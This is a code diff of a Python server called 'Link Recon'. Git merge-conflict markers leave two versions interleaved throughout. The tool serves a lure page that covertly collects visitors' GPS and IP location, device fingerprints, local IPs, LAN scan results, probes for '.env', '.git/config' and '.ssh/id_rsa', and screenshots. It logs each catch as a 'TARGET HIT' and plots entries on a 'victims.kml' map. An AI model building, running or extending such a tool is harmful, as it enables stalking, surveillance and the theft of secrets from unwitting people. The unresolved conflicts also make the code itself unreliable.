@@ -40,7 +40,11 @@ from dataclasses import dataclass
 class Config:
     host: str = "0.0.0.0"
     port: int = 5000
+<<<<<<< HEAD
     use_https: bool = True  # HTTPS enabled by default for security
+=======
+    use_https: bool = False
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
     cert_file: str = "cert.pem"
     key_file: str = "key.pem"
     rate_limit: int = 100
@@ -49,7 +53,10 @@ class Config:
     lan_scan_range: List[str] = None
     file_probes: List[str] = None
     geo_apis: List[str] = None
+<<<<<<< HEAD
     google_maps_api_key: str = ""  # Optional Google Maps API key for enhanced features
+=======
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
     enable_gps: bool = True  # Enable HTML5 GPS geolocation
     gps_timeout: float = 10.0  # GPS request timeout
     gps_accuracy_threshold: float = 100  # Minimum accuracy in meters
@@ -65,6 +72,7 @@ class Config:
         if self.file_probes is None:
             self.file_probes = ["/robots.txt", "/.env", "/.git/config", "/.ssh/id_rsa"]
         if self.geo_apis is None:
+<<<<<<< HEAD
             self.geo_apis = [
                 "https://ipinfo.io/json",
                 "https://ipapi.co/json/",
@@ -382,6 +390,147 @@ class DataExporterClass:
         except Exception as e:
             log(f"Screenshot save failed: {e}")
 
+=======
+            self.geo_apis = ["https://ipinfo.io/json", "https://ipapi.co/json/"]
+    
+    def load_from_file(self, path: str) -> 'Config':
+        if os.path.exists(path):
+            with open(path, 'r') as f:
+                data = json.load(f)
+                for k, v in data.items():
+                    if hasattr(self, k):
+                        setattr(self, k, v)
+        return self
+
+
+# ============================================================================
+#                               GLOBAL STATE
+# ============================================================================
+
+config = Config()
+_db = None
+_exporter = None
+_kml_path = "victims.kml"
+_logs_file = None
+
+def log_print(*args, **kwargs):
+    """Print with timestamp."""
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    print(f"[{timestamp}]", *args, **kwargs)
+
+
+def log_file(*args, **kwargs):
+    """Log to file."""
+    if _logs_file:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        try:
+            with open(_logs_file, 'a') as f:
+                f.write(f"[{timestamp}] " + " ".join(str(a) for a in args) + "\n")
+        except:
+            pass
+
+
+def log(*args, **kwargs):
+    """Log to both console and file."""
+    log_print(*args, **kwargs)
+    log_file(*args, **kwargs)
+
+
+def init_globals():
+    """Initialize global variables."""
+    global _db, _exporter, _kml_path, _logs_file
+    os.makedirs(config.output_dir, exist_ok=True)
+    _logs_file = os.path.join(config.output_dir, "link_recon.log")
+    _db_path = os.path.join(config.output_dir, "recon_data.db")
+    _db = sqlite3.connect(_db_path, check_same_thread=False)
+    _init_db()
+    _exporter = DataExporterClass(config.output_dir)
+    _kml_path = os.path.join(config.output_dir, "victims.kml")
+    log(f"Global state initialized. Output: {config.output_dir}")
+
+
+def _init_db():
+    """Initialize database schema."""
+    cursor = _db.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS reports (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            report_id TEXT UNIQUE,
+            timestamp TEXT,
+            client_ip TEXT,
+            city TEXT,
+            country TEXT,
+            latitude REAL,
+            longitude REAL,
+            gps_latitude REAL,
+            gps_longitude REAL,
+            gps_accuracy REAL,
+            gps_altitude REAL,
+            user_agent TEXT,
+            os_platform TEXT,
+            screen_res TEXT,
+            timezone TEXT,
+            local_ips TEXT,
+            lan_scan TEXT,
+            file_probes TEXT,
+            network_type TEXT,
+            data_hash TEXT,
+            raw_json TEXT
+        )
+    ''')
+    _db.commit()
+
+
+# ============================================================================
+#                               DATA EXPORTER
+# ============================================================================
+
+class DataExporterClass:
+    def __init__(self, output_dir: str):
+        self.output_dir = output_dir
+        os.makedirs(output_dir, exist_ok=True)
+        os.makedirs(os.path.join(output_dir, "screenshots"), exist_ok=True)
+    
+    def export_json(self, report_id: str, data: Dict) -> str:
+        path = os.path.join(self.output_dir, f"{report_id}.json")
+        with open(path, 'w', encoding='utf-8') as f:
+            json.dump({'report_id': report_id, 'timestamp': datetime.now().isoformat(), 'data': data}, f, indent=2)
+        return path
+    
+    def export_csv(self, report_id: str, data: Dict) -> str:
+        path = os.path.join(self.output_dir, f"{report_id}.csv")
+        ip_info = data.get('ipInfo', {})
+        fields = ['report_id', 'timestamp', 'ip', 'city', 'country', 'os', 'browser', 'screen', 'timezone']
+        row = {
+            'report_id': report_id,
+            'timestamp': data.get('timestamp', ''),
+            'ip': ip_info.get('ip', ''),
+            'city': ip_info.get('city', ''),
+            'country': ip_info.get('country', ''),
+            'os': data.get('platform', ''),
+            'browser': (data.get('userAgent', '') or '')[:100],
+            'screen': data.get('screen', ''),
+            'timezone': data.get('timezone', '')
+        }
+        write_header = not os.path.exists(path)
+        with open(path, 'a', newline='', encoding='utf-8') as f:
+            writer = csv.DictWriter(f, fieldnames=fields)
+            if write_header:
+                writer.writeheader()
+            writer.writerow(row)
+        return path
+    
+    def save_screenshot(self, report_id: str, screenshot_data: str):
+        try:
+            if ',' in screenshot_data:
+                img_data = screenshot_data.split(',')[1]
+                path = os.path.join(self.output_dir, "screenshots", f"{report_id}.png")
+                with open(path, "wb") as f:
+                    f.write(base64.b64decode(img_data))
+        except Exception as e:
+            log(f"Screenshot save failed: {e}")
+
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
 
 # ============================================================================
 #                               RATE LIMITER
@@ -415,6 +564,7 @@ rate_limiter = RateLimiter()
 # ============================================================================
 
 def update_kml(ip_info: Dict, gps_data: Dict = None):
+<<<<<<< HEAD
     """Add detailed placemark to KML file with enhanced location data."""
     global _kml_path
     try:
@@ -426,12 +576,24 @@ def update_kml(ip_info: Dict, gps_data: Dict = None):
             altitude = gps_data.get('gps_altitude', 0)
             source = f"GPS (accuracy: {accuracy}m)"
             coordinates = f"{lon},{lat},{altitude}"
+=======
+    """Add placemark to KML file with GPS support."""
+    global _kml_path
+    try:
+        # Use GPS data if available and accurate, otherwise fall back to IP geolocation
+        if gps_data and gps_data.get('gps_lat') and gps_data.get('gps_accuracy', 999) < 100:
+            lat = gps_data['gps_lat']
+            lon = gps_data['gps_lon']
+            accuracy = gps_data.get('gps_accuracy', 0)
+            source = f"GPS (accuracy: {accuracy}m)"
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
         else:
             loc = ip_info.get('loc', '')
             if not loc or 'N/A' in loc:
                 return
             lat, lon = loc.split(',')
             source = "IP Geolocation"
+<<<<<<< HEAD
             coordinates = f"{lon},{lat},0"
 
         # Enhanced location information
@@ -651,6 +813,101 @@ def log_harvest(data: Dict, ip_info: Dict, report_id: str, gps_data: Dict = None
     log("")
     log("=" * 70)
 
+=======
+        
+        ip = ip_info.get('ip', 'Unknown')
+        city = ip_info.get('city', 'N/A')
+        country = ip_info.get('country', 'N/A')
+        
+        is_new = not os.path.exists(_kml_path)
+        with open(_kml_path, 'a') as f:
+            if is_new:
+                f.write('<?xml version="1.0" encoding="UTF-8"?>\n<kml xmlns="http://www.opengis.net/kml/2.2">\n<Document>\n<name>Targets</name>\n')
+            f.write(f'<Placemark><name>{ip}</name><description>{city}, {country} ({source})</description><Point><coordinates>{lon},{lat},0</coordinates></Point></Placemark>\n')
+        log(f"KML updated: {ip} ({source})")
+    except Exception as e:
+        log(f"KML update failed: {e}")
+
+
+# ============================================================================
+#                               DETAILED HARVEST LOGGING
+# ============================================================================
+
+def log_harvest(data: Dict, ip_info: Dict, report_id: str, gps_data: Dict = None):
+    """Log detailed harvest information to console."""
+    log("")
+    log("=" * 70)
+    log("  TARGET HIT - DETAILED HARVEST REPORT")
+    log("=" * 70)
+    log(f"  Report ID:     {report_id}")
+    log(f"  Timestamp:     {data.get('timestamp', 'N/A')}")
+    log("-" * 70)
+    
+    # GPS Precise Location (if available)
+    if gps_data and gps_data.get('gps_lat'):
+        log("  [PRECISE GPS LOCATION]")
+        log(f"    Latitude:     {gps_data.get('gps_lat', 'N/A')}")
+        log(f"    Longitude:    {gps_data.get('gps_lon', 'N/A')}")
+        log(f"    Accuracy:     {gps_data.get('gps_accuracy', 'N/A')}m")
+        if gps_data.get('gps_altitude'):
+            log(f"    Altitude:     {gps_data.get('gps_altitude', 'N/A')}m")
+        log("")
+    
+    # IP & Location
+    log("  [IP GEOLOCATION]")
+    log(f"    Public IP:    {ip_info.get('ip', 'N/A')}")
+    log(f"    City:         {ip_info.get('city', 'N/A')}")
+    log(f"    Region:       {ip_info.get('region', 'N/A')}")
+    log(f"    Country:      {ip_info.get('country', 'N/A')}")
+    log(f"    Coordinates:  {ip_info.get('loc', 'N/A')}")
+    log(f"    ISP:          {ip_info.get('org', 'N/A')}")
+    if ip_info.get('googleMaps'):
+        log(f"    Google Maps: {ip_info.get('googleMaps')}")
+    log("")
+    
+    # Device Info
+    log("  [DEVICE INFORMATION]")
+    log(f"    OS:           {data.get('platform', 'N/A')}")
+    log(f"    Browser:      {data.get('userAgent', 'N/A')[:80]}...")
+    log(f"    Screen:       {data.get('screen', 'N/A')}")
+    log(f"    Viewport:     {data.get('viewport', 'N/A')}")
+    log(f"    Language:     {data.get('language', 'N/A')}")
+    log(f"    Timezone:     {data.get('timezone', 'N/A')}")
+    log(f"    WebGL:         {data.get('hasWebGL', 'N/A')}")
+    log(f"    Online:        {data.get('online', 'N/A')}")
+    log("")
+    
+    # Network Info
+    log("  [NETWORK DETECTION]")
+    log(f"    Network:      {data.get('networkType', 'N/A')}")
+    log(f"    Latency:      {data.get('rtt', 'N/A')} ms")
+    log(f"    Local IPs:    {', '.join(data.get('localIps', ['N/A']))}")
+    log("")
+    
+    # LAN Scan
+    log("  [LAN SCAN RESULTS]")
+    for host, status in data.get('lanScan', {}).items():
+        status_icon = "[OK]" if status == "reachable" else "[X]"
+        log(f"    {status_icon} {host} -> {status}")
+    log("")
+    
+    # File Probes
+    log("  [FILE SYSTEM PROBES]")
+    for path, status in data.get('fileHints', {}).items():
+        status_icon = "[FOUND]" if status == "exists" else "[X]"
+        log(f"    {status_icon} {path}")
+    log("")
+    
+    log("  [DATA SAVED]")
+    log(f"    JSON:         {config.output_dir}/{report_id}.json")
+    log(f"    CSV:          {config.output_dir}/{report_id}.csv")
+    log(f"    Screenshot:   {config.output_dir}/screenshots/{report_id}.png")
+    log(f"    Database:     {config.output_dir}/recon_data.db")
+    log(f"    KML Map:      {config.output_dir}/victims.kml")
+    log("")
+    log("=" * 70)
+
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
 
 # ============================================================================
 #                               HTTP HANDLER
@@ -669,8 +926,11 @@ class ReconHandler(http.server.SimpleHTTPRequestHandler):
             self.serve_recon_page()
         elif self.path == '/dashboard':
             self.serve_dashboard()
+<<<<<<< HEAD
         elif self.path == '/test':
             self.serve_test_page()
+=======
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
         elif self.path == '/favicon.ico':
             self.send_error(204)
         else:
@@ -953,6 +1213,7 @@ class ReconHandler(http.server.SimpleHTTPRequestHandler):
         self.send_header('Content-type', 'text/html')
         self.end_headers()
         self.wfile.write(html.encode())
+<<<<<<< HEAD
 
     def serve_test_page(self):
         """Serve a simple test page to check location detection."""
@@ -1036,6 +1297,9 @@ class ReconHandler(http.server.SimpleHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(html.encode())
 
+=======
+    
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
     def serve_dashboard(self):
         """Serve dashboard with statistics."""
         stats = {'total': 0, 'countries': {}, 'platforms': {}}
@@ -1110,6 +1374,7 @@ def generate_cert():
     """Generate self-signed certificate."""
     try:
         import subprocess
+<<<<<<< HEAD
         result = subprocess.run([
             'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
             '-keyout', config.key_file, '-out', config.cert_file,
@@ -1132,10 +1397,17 @@ def generate_cert():
     except Exception as e:
         log(f"Certificate generation failed: {e}")
         raise
+=======
+        subprocess.run(['openssl', 'req', '-x509', '-newkey', 'rsa:2048', '-keyout', 'key.pem', '-out', 'cert.pem', '-days', '365', '-nodes', '-subj', '/CN=localhost'], check=True, capture_output=True)
+        log("Certificate generated: cert.pem, key.pem")
+    except Exception as e:
+        log(f"Certificate generation failed: {e}")
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
 
 
 def parse_args():
     parser = argparse.ArgumentParser(description='Link Recon - Information Gathering Tool')
+<<<<<<< HEAD
     parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
     parser.add_argument('--port', type=int, default=5000, help='Port to listen on')
     parser.add_argument('--https', action='store_true', help='Enable HTTPS')
@@ -1155,10 +1427,22 @@ def parse_args():
         parser.error(f"Configuration file does not exist: {args.config}")
 
     return args
+=======
+    parser.add_argument('--host', default='0.0.0.0')
+    parser.add_argument('--port', type=int, default=5000)
+    parser.add_argument('--https', action='store_true')
+    parser.add_argument('--cert', default='cert.pem')
+    parser.add_argument('--key', default='key.pem')
+    parser.add_argument('--config', help='Config file path')
+    parser.add_argument('--output', default='reports')
+    parser.add_argument('--no-dashboard', action='store_true')
+    return parser.parse_args()
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
 
 
 def main():
     global config
+<<<<<<< HEAD
 
     try:
         args = parse_args()
@@ -1202,6 +1486,42 @@ def main():
         if config.enable_dashboard:
             log(f"Dashboard: {protocol}://{config.host}:{config.port}/dashboard")
 
+=======
+    
+    args = parse_args()
+    config.host = args.host
+    config.port = args.port
+    config.use_https = args.https
+    config.cert_file = args.cert
+    config.key_file = args.key
+    config.output_dir = args.output
+    config.enable_dashboard = not args.no_dashboard
+    
+    if args.config:
+        config.load_from_file(args.config)
+    
+    # Initialize
+    init_globals()
+    
+    if config.use_https and not (os.path.exists(config.cert_file) and os.path.exists(config.key_file)):
+        generate_cert()
+    
+    # Create server
+    try:
+        if config.use_https and os.path.exists(config.cert_file) and os.path.exists(config.key_file):
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            ctx.load_cert_chain(config.cert_file, config.key_file)
+            server = ThreadedTCPServer((config.host, config.port), ReconHandler)
+            server.socket = ctx.wrap_socket(server.socket, server_side=True)
+            log(f"HTTPS Server started: https://{config.host}:{config.port}")
+        else:
+            server = ThreadedTCPServer((config.host, config.port), ReconHandler)
+            log(f"HTTP Server started: http://{config.host}:{config.port}")
+        
+        if config.enable_dashboard:
+            log(f"Dashboard: http://{config.host}:{config.port}/dashboard")
+        
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
         log("")
         log("=" * 60)
         log("  LINK RECON v2.0 - Ready")
@@ -1209,6 +1529,7 @@ def main():
         log("")
         log("Press Ctrl+C to stop")
         log("")
+<<<<<<< HEAD
 
         server.serve_forever()
 
@@ -1218,6 +1539,13 @@ def main():
     except Exception as e:
         log(f"Fatal error: {e}")
         raise
+=======
+        
+        server.serve_forever()
+    except KeyboardInterrupt:
+        log("")
+        log("Stopping server...")
+>>>>>>> 9c17de5df98eca5c5ce0b0e7f3f859614ad404c2
     finally:
         if _db:
             _db.close()
